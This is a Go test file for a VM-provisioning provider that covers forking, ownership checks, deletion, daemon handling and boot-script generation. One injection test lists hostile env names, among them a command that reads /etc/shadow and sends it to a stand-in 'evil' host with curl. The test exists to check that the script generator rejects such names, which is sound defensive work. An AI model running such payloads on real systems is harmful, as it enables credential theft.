package arker

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/google/uuid"
	"github.com/omnara-ai/omnara/internal/machinepool/providers"
	"github.com/omnara-ai/omnara/internal/storage/storeerr"
)

func TestArkerProviderProvisionForksByAllocationName(t *testing.T) {
	name := testAllocationName(t)
	fake := &fakeArker{}
	machineProvider := newTestProvider(fake.start(t, name).URL)

	result, err := machineProvider.ProvisionMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), "tok-1", nil,
	)
	if err != nil {
		t.Fatalf("provision: %v", err)
	}
	if result.ProviderResourceID != testVMID {
		t.Fatalf("resource id = %q, want %q", result.ProviderResourceID, testVMID)
	}
	if result.SandboxURL == "" {
		t.Fatal("sandbox url is empty, so WakeMachine would have no endpoint")
	}

	_, body, _, _ := fake.snapshot()
	if body["name"] != name {
		t.Fatalf("fork name = %v, want %q", body["name"], name)
	}
	if body["source_vm_name"] != "ubuntu-base" {
		t.Fatalf("fork source = %v, want ubuntu-base", body["source_vm_name"])
	}
	resources, ok := body["resources"].(map[string]any)
	if !ok {
		t.Fatalf("fork carried no resources: %v", body)
	}
	if resources["vcpu"] != float64(2) || resources["memory_mib"] != float64(4096) {
		t.Fatalf("fork resources = %v, want vcpu 2 and memory_mib 4096", resources)
	}
}

func TestArkerProviderProvisionKeyIsStableAcrossAttempts(t *testing.T) {
	name := testAllocationName(t)
	fake := &fakeArker{}
	machineProvider := newTestProvider(fake.start(t, name).URL)
	config := testProvisioning(testOptions())

	for _, token := range []string{"attempt-1", "attempt-2"} {
		if _, err := machineProvider.ProvisionMachine(
			context.Background(), testInstallationID, testMachineID, config, token, nil,
		); err != nil {
			t.Fatalf("provision under %s: %v", token, err)
		}
	}
	keys, _, _, _ := fake.snapshot()
	if len(keys) != 2 || keys[0] != keys[1] {
		t.Fatalf("attempts sent keys %v, want one key for the machine", keys)
	}
	if keys[0] != name {
		t.Fatalf("key = %q, want the allocation name %q", keys[0], name)
	}
}

func TestArkerProviderProvisionReportsAVMThatIsNotThisMachine(t *testing.T) {
	fake := &fakeArker{vmName: "omnara-mch-somebodyelse"}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	result, err := machineProvider.ProvisionMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), "tok-1", nil,
	)
	if err == nil || !strings.Contains(err.Error(), "does not belong to machine") {
		t.Fatalf("adopting a foreign vm must fail, got %v", err)
	}
	if result.ProviderResourceID != testVMID {
		t.Fatalf("the id must come back so cleanup can remove the vm, got %q",
			result.ProviderResourceID)
	}
	if fake.deletes.Load() != 0 {
		t.Fatalf("issued %d deletes; deleting here spends the machine's key for good",
			fake.deletes.Load())
	}
}

func TestArkerProviderDeleteRemovesAVMWhoseNameIsUnexpected(t *testing.T) {
	fake := &fakeArker{vmName: "something-else-entirely"}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	if err := machineProvider.DeleteMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), testVMID,
	); err != nil {
		t.Fatalf("delete by recorded id: %v", err)
	}
	if fake.deletes.Load() != 1 {
		t.Fatalf("issued %d deletes; a vm nothing can remove stays billable",
			fake.deletes.Load())
	}
}

func TestArkerProviderDaemonStartAdoptsABootAlreadyRunning(t *testing.T) {
	fake := &fakeArker{daemonAliveIn: "running"}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	if _, err := machineProvider.ProvisionMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), "tok-1", nil,
	); err != nil {
		t.Fatalf("provision: %v", err)
	}
	if fake.runs.Load() != 0 {
		t.Fatalf("started %d daemons, want the running one adopted", fake.runs.Load())
	}
	if fake.writes.Load() != 0 {
		t.Fatalf("rewrote the boot script %d times while adopting", fake.writes.Load())
	}
}

func TestArkerProviderProvisionReportsTheResourceIDWhenTheDaemonFails(t *testing.T) {
	fake := &fakeArker{writeStatus: http.StatusBadRequest}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	result, err := machineProvider.ProvisionMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), "tok-1", nil,
	)
	if err == nil {
		t.Fatal("expected the daemon handoff to fail")
	}
	if result.ProviderResourceID != testVMID {
		t.Fatalf("failed provision dropped the resource id: %q", result.ProviderResourceID)
	}
}

func TestArkerProviderProvisionFailsWhenTheDaemonExitsNonZero(t *testing.T) {
	fake := &fakeArker{daemonState: "completed", daemonExit: ptr(1)}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	_, err := machineProvider.ProvisionMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), "tok-1", nil,
	)
	if err == nil || !strings.Contains(err.Error(), "instead of running") {
		t.Fatalf("a dead daemon must fail the provision, got %v", err)
	}
}

func TestArkerProviderDaemonKeepsTheTokenOutOfReadableFields(t *testing.T) {
	fake := &fakeArker{}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	if _, err := machineProvider.ProvisionMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), "super-secret-token", nil,
	); err != nil {
		t.Fatalf("provision: %v", err)
	}
	_, _, env, command := fake.snapshot()
	if command == "" {
		t.Fatal("no run was issued, so the daemon never started")
	}
	if strings.Contains(command, "super-secret-token") {
		t.Fatalf("daemon command carries the machine token: %s", command)
	}
	if _, present := env["OMNARA_MACHINE_TOKEN"]; present {
		t.Fatalf("session env carries the machine token, which is readable back: %v", env)
	}
	if fake.writes.Load() != 1 {
		t.Fatalf("wrote %d files, want one boot script", fake.writes.Load())
	}
}

func TestArkerBootScriptRemovesItselfFirst(t *testing.T) {
	script, err := bootScript(map[string]string{"OMNARA_MACHINE_TOKEN": "secret"})
	if err != nil {
		t.Fatalf("build boot script: %v", err)
	}
	first, _, _ := strings.Cut(script, "\n")
	if first != `rm -f "$0"` {
		t.Fatalf("boot script starts with %q, want it to delete itself first", first)
	}
	if !strings.Contains(script, "export OMNARA_MACHINE_TOKEN='secret'") {
		t.Fatalf("boot script does not export the env:\n%s", script)
	}
}

func TestArkerBootScriptRejectsAnEnvNameThatIsNotAnIdentifier(t *testing.T) {
	for _, hostile := range []string{
		"$(curl -s http://evil/?d=$(cat /etc/shadow))",
		"A\nid\nB",
		"with-dash",
		"1LEADING_DIGIT",
	} {
		if _, err := bootScript(map[string]string{hostile: "x"}); err == nil {
			t.Fatalf("env name %q was rendered into the boot script", hostile)
		}
	}
}

func TestArkerBootScriptQuotesValues(t *testing.T) {
	script, err := bootScript(map[string]string{"K": `a'b; id`})
	if err != nil {
		t.Fatalf("build boot script: %v", err)
	}
	if !strings.Contains(script, `export K='a'\''b; id'`) {
		t.Fatalf("value was not safely quoted:\n%s", script)
	}
}

func TestArkerProviderInspectFindsTheMachineByResourceID(t *testing.T) {
	fake := &fakeArker{}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	id, found, err := machineProvider.InspectMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), testVMID,
	)
	if err != nil || !found || id != testVMID {
		t.Fatalf("inspect = (%q, %v, %v), want the provisioned id", id, found, err)
	}
}

func TestArkerProviderInspectRejectsAVMBelongingToAnotherMachine(t *testing.T) {
	fake := &fakeArker{vmName: "omnara-mch-somebodyelse"}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	_, found, err := machineProvider.InspectMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), testVMID,
	)
	if found || err == nil || !strings.Contains(err.Error(), "does not belong to machine") {
		t.Fatalf("inspect of a foreign vm = (%v, %v), want an ownership error", found, err)
	}
}

func TestArkerProviderInspectReportsAnUnknownResourceIDAsAbsent(t *testing.T) {
	fake := &fakeArker{}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	id, found, err := machineProvider.InspectMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), "",
	)
	if err != nil || found || id != "" {
		t.Fatalf("empty resource id = (%q, %v, %v), want absent", id, found, err)
	}
	if fake.forks.Load() != 0 {
		t.Fatal("inspect must not create anything")
	}
}

func TestArkerProviderDeleteRemovesTheMachine(t *testing.T) {
	fake := &fakeArker{}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	if err := machineProvider.DeleteMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), testVMID,
	); err != nil {
		t.Fatalf("delete: %v", err)
	}
	if fake.deletes.Load() != 1 {
		t.Fatalf("issued %d deletes, want one", fake.deletes.Load())
	}
}

func TestArkerProviderDeleteIsRetrySafeWhenAlreadyAbsent(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/v1/vms/", func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, `{"error":{"code":"not_found","message":"gone"}}`)
	})
	server := httptest.NewServer(mux)
	t.Cleanup(server.Close)

	if err := newTestProvider(server.URL).DeleteMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), testVMID,
	); err != nil {
		t.Fatalf("delete on an absent machine must succeed, got %v", err)
	}
}

func TestArkerProviderDeleteRequiresAResourceID(t *testing.T) {
	err := newTestProvider("https://example.invalid").DeleteMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), "",
	)
	if err == nil {
		t.Fatal("delete without a resource id must fail rather than guess")
	}
}

func TestArkerProviderWakeRunsANoOpCommand(t *testing.T) {
	fake := &fakeArker{}
	server := fake.start(t, testAllocationName(t))
	machineProvider := newTestProvider(server.URL)

	for i := range 2 {
		if err := machineProvider.WakeMachine(context.Background(), providers.WakeMachineInput{
			ProviderResourceID: testVMID,
			SandboxURL:         server.URL,
		}); err != nil {
			t.Fatalf("wake attempt %d: %v", i+1, err)
		}
	}
	if fake.runs.Load() != 2 {
		t.Fatalf("wake issued %d runs, want one per call", fake.runs.Load())
	}
	if fake.forks.Load() != 0 {
		t.Fatal("wake must never fork")
	}
}

func TestArkerProviderReportsServerErrorsAsProviderUnavailable(t *testing.T) {
	fake := &fakeArker{forkStatus: http.StatusServiceUnavailable}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	_, err := machineProvider.ProvisionMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), "tok-1", nil,
	)
	if !errors.Is(err, storeerr.ErrMachineProviderUnavailable) {
		t.Fatalf("a 503 must be provider-unavailable so the pool backs off, got %v", err)
	}
}

func TestArkerProviderPrepareProvisioningEchoesTheRequestedSize(t *testing.T) {
	fake := &fakeArker{}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	facts, err := machineProvider.PrepareProvisioning(
		context.Background(),
		testProvisioning(testOptions()),
	)
	if err != nil {
		t.Fatalf("prepare: %v", err)
	}
	if facts.CPU == nil || *facts.CPU != 2 || facts.MemoryMB == nil || *facts.MemoryMB != 4096 {
		t.Fatalf("facts = %+v, want the requested size", facts)
	}
	if fake.forks.Load() != 0 {
		t.Fatal("PrepareProvisioning must not touch external resources")
	}
}

func TestArkerProviderAllocationNameIsStablePerMachine(t *testing.T) {
	first := testAllocationName(t)
	second := testAllocationName(t)
	if first != second {
		t.Fatalf("allocation name is not stable: %q then %q", first, second)
	}
	other, err := providers.MachineAllocationName(testInstallationID, uuid.New())
	if err != nil {
		t.Fatalf("build allocation name: %v", err)
	}
	if other == first {
		t.Fatal("two machines share an allocation name, so they would share a key")
	}
}

func TestArkerProviderDaemonStartAdoptsAPendingBoot(t *testing.T) {
	fake := &fakeArker{daemonAliveIn: "pending"}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	if _, err := machineProvider.ProvisionMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), "tok-1", nil,
	); err != nil {
		t.Fatalf("provision: %v", err)
	}
	if fake.runs.Load() != 0 {
		t.Fatalf("started %d daemons, want the pending boot adopted", fake.runs.Load())
	}
}

func TestArkerProviderDaemonRunsInItsOwnSessionWithoutCreatingOne(t *testing.T) {
	fake := &fakeArker{}
	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

	if _, err := machineProvider.ProvisionMachine(
		context.Background(), testInstallationID, testMachineID,
		testProvisioning(testOptions()), "tok-1", nil,
	); err != nil {
		t.Fatalf("provision: %v", err)
	}
	if fake.sessions.Load() != 0 {
		t.Fatalf("created %d sessions; a session index is find-or-create", fake.sessions.Load())
	}
	if fake.runSessionIdx != daemonSessionIdx {
		t.Fatalf("daemon ran at session index %d, want %d (0 is where plain runs land)",
			fake.runSessionIdx, daemonSessionIdx)
	}
}

func TestArkerProviderProvisionFailsWhenTheDaemonEndsInAnyTerminalState(t *testing.T) {
	for _, dead := range []struct {
		state string
		exit  *int
	}{
		{state: "completed", exit: ptr(0)},
		{state: "failed"},
		{state: "cancelled"}, //nolint:misspell // the wire value.
	} {
		t.Run(dead.state, func(t *testing.T) {
			fake := &fakeArker{daemonState: dead.state, daemonExit: dead.exit}
			machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)

			_, err := machineProvider.ProvisionMachine(
				context.Background(), testInstallationID, testMachineID,
				testProvisioning(testOptions()), "tok-1", nil,
			)
			if err == nil || !strings.Contains(err.Error(), "instead of running") {
				t.Fatalf("a %s daemon must fail the provision, got %v", dead.state, err)
			}
		})
	}
}
